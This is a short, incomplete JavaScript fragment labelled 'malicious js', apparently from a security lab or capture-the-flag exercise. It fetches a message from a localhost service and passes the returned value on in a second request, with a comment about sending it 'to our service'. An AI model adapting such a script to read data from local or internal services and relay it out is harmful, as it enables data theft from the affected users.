//malicious js

const get_msg = () => {
    fetch("http://127.0.0.1/message/3")
    .then(response => response.json())
    .then(data => {
      msg = data.message;
      loadLetter(); // Send message to our service
    })
}

const loadLetter = () => {
  ...
  fetch(`/message/${msg}`)
  ...
  }

get_msg();
